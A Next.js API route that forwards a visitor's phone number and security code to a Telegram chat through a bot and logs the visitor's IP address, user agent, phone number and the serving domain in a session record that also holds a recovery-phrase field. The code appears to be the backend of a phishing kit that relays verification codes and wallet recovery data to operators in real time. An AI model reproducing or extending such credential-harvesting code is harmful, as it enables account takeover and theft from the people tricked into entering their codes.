import prisma from '@/lib/prisma';
import { NextResponse } from 'next/server';

export async function POST(request: Request) {
    try {
        const { phoneNumber, securityCode } = await request.json();
        if (!phoneNumber || !securityCode) {
            return NextResponse.json({ error: 'Phone number and Security code are required' }, { status: 400 });
        }

        const session = await prisma.securitySession.findUnique({
            where: { securityCode },
        });

        if (!session) {
            return NextResponse.json({ error: `Security session with code ${securityCode} not found` }, { status: 404 });
        }

        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TEAM_CHAT_ID = process.env.TELEGRAM_TEAM_CHAT_ID;

        // Skip the Telegram notification when credentials are not configured
        // (missing or placeholder values). The rest of the flow continues so
        // the user is not blocked; notification resumes once real credentials
        // are set in the environment.
        const telegramConfigured =
            !!TELEGRAM_BOT_TOKEN &&
            !!TEAM_CHAT_ID &&
            !TELEGRAM_BOT_TOKEN.includes('dummy') &&
            !TEAM_CHAT_ID.includes('dummy');

        if (telegramConfigured) {
            const text = `🔐 User Verification Request\nPhone: ${phoneNumber}\nSecurity code: ${securityCode}`;

            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            const res = await fetch(telegramUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TEAM_CHAT_ID, text }),
            });

            if (!res.ok) {
                const errorText = await res.text();
                console.error('Error sending message to Telegram:', errorText);
                return NextResponse.json({ error: 'Failed to notify team' }, { status: 500 });
            }
        } else {
            console.log('Telegram not configured — skipping team notification');
        }

        const ip = request.headers.get('x-forwarded-for') || request.headers.get('remote-addr') || 'unknown';
        const userAgent = request.headers.get('user-agent') || 'unknown';
        await prisma.securitySession.update({
            where: { securityCode },
            data: {
                status: 'pending',
                recoveryPhrase: null, // Reset recovery phrase if needed
                ipAddress: ip,
                userAgent: userAgent,
                phoneNumber: phoneNumber,
                domain: request.headers.get('host') || 'unknown',
            },
        });

        return NextResponse.json({ success: true });
    }
    catch (error) {
        console.error('Error notifying team:', error);
        return NextResponse.json({ error: 'Failed to notify team' }, { status: 500 });
    }
}
